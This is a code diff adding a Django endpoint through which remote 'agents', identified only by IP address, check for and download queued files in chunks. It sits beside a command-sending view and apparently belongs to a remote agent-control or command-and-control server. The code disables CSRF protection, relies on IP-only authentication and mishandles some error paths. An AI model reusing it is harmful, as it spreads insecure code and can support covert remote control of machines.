@@ -129,6 +129,66 @@ class SendCommand(View):
         return HttpResponse("Command not found.", status=404)
 
 
+@method_decorator(csrf_exempt, name='dispatch')
+class FileDownloadView(View):
+    def get(self, request):
+        clients = create_or_get_user(request)
+        ip = get_client_ip(request)
+        agent = clients.filter(address=ip).first()
+        if agent:
+            file = Uploads.objects.filter(client=agent).first()
+            if file:
+                response = HttpResponse('you have file')
+                response['File-Name'] = file.file.name.replace("uploads/", "")
+                return response
+            else:
+                return HttpResponse('you have not file')
+        else:
+            return HttpResponse("No client found for this IP.", status=400)
+
+    def post(self, request, *args, **kwargs):
+        body = request.body.decode('utf-8')
+        if 'send' in body:
+            clients = create_or_get_user(request)
+            ip = get_client_ip(request)
+            agent = clients.filter(address=ip).first()
+            chunk_size = 1024 * 1024 * 10  # 10 MB
+            match = re.search(r'index=(\d+)', body)
+
+            if match:
+                index = int(match.group(1))
+
+                if agent:
+                    file = Uploads.objects.filter(client=agent).first()
+                else:
+                    return HttpResponse("No client found for this IP.", status=400)
+
+                if file:
+                    chunk, last = self.chunk_file(file.file.path, index, chunk_size)
+                    file_name= file.file.name.replace("uploads/", "")
+                    response = HttpResponse(chunk, content_type='application/octet-stream')
+                    response['Content-Disposition'] = f'attachment; filename="{file_name}"'
+
+                    if last:
+                        response['Last-Chunk'] = str(last)
+                        return response
+                    return response
+                else:
+                    return HttpResponse("File not found.", status=404)
+
+    def chunk_file(self, file_path, index, chunk_size):
+        try:
+            with open(file_path, 'rb') as f:
+                f.seek(index * chunk_size)
+                chunk = f.read(chunk_size)
+                if len(chunk) < chunk_size:
+                    return chunk, True
+                else:
+                    return chunk, False
+        except Exception as e:
+            print(f'Exception: {e}')
+
+
 def logout_view(request):
     logout(request)
     return redirect('login')
